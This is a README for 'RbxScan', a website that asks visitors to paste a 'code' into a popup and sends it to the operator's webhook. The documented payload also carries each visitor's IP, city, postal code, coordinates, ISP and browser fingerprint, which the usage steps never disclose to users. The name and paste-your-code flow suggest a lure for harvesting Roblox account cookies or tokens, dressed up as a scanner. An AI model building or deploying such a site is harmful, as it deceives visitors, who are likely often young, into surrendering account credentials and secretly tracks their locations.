# RbxScan Website

A modern, responsive website that allows users to scan and submit codes through a popup modal to your webhook endpoint.

## Features

- 🎨 Beautiful, modern UI with gradient backgrounds and smooth animations
- 📱 Fully responsive design that works on all devices
- ⚡ Fast and lightweight - no external dependencies
- 🔒 Secure webhook integration
- ✨ Professional user experience with loading states and feedback messages
- ⌨️ Keyboard shortcuts (Ctrl/Cmd+Enter to submit, Esc to close)

## Setup Instructions

### 1. Configure Your Webhook URL

Open `script.js` and replace the placeholder webhook URL with your actual endpoint:

```javascript
const WEBHOOK_URL = 'https://your-webhook-url-here.com/webhook';
```

### 2. Webhook Data Format

Your webhook will receive POST requests with the following JSON structure:

```json
{
  "code": "user-submitted-code",
  "timestamp": "2024-01-15T10:30:00.000Z",
  "userAgent": "Mozilla/5.0...",
  "source": "rbxscan-website",
  "location": {
    "ip": "192.168.1.1",
    "city": "New York",
    "region": "New York",
    "country": "United States",
    "country_code": "US",
    "postal": "10001",
    "latitude": 40.7128,
    "longitude": -74.0060,
    "timezone": "America/New_York",
    "isp": "Internet Service Provider"
  },
  "browser": {
    "language": "en-US",
    "languages": ["en-US", "en"],
    "platform": "Win32",
    "cookieEnabled": true,
    "onLine": true,
    "screenResolution": "1920x1080",
    "colorDepth": 24,
    "pixelDepth": 24
  }
}
```

### 3. Host the Website

You can host this website using any static hosting service:

- **Local Development**: Simply open `index.html` in your browser
- **GitHub Pages**: Push to a GitHub repository and enable Pages
- **Netlify**: Drag and drop the folder to Netlify
- **Vercel**: Connect your repository to Vercel
- **Any web server**: Upload the files to your server

## File Structure

```
├── index.html      # Main HTML file with structure and modal
├── styles.css      # Beautiful CSS styling and animations
├── script.js       # JavaScript functionality and webhook integration
└── README.md       # This file
```

## Usage

1. Users click the "Scan Code" button
2. A modal popup appears with a text area
3. Users paste their code into the text area
4. Click "Submit" to send the code to your webhook
5. Success/error feedback is shown to the user

## Customization

### Styling
- Edit `styles.css` to customize colors, fonts, and layout
- The design uses CSS variables for easy theme customization
- Responsive breakpoints are already configured

### Functionality
- Modify `script.js` to add additional form fields
- Customize the data sent to your webhook
- Add validation rules as needed

### Webhook Integration
- Ensure your webhook endpoint accepts POST requests
- Handle JSON content type: `application/json`
- Return appropriate HTTP status codes for success/failure

## Browser Compatibility

- Chrome/Edge 90+
- Firefox 88+
- Safari 14+
- Mobile browsers (iOS Safari, Chrome Mobile)

## Security Notes

- Always validate data on your webhook server
- Consider implementing rate limiting
- Use HTTPS for your webhook endpoint
- Sanitize any user input before processing

## License

This project is open source and available under the MIT License.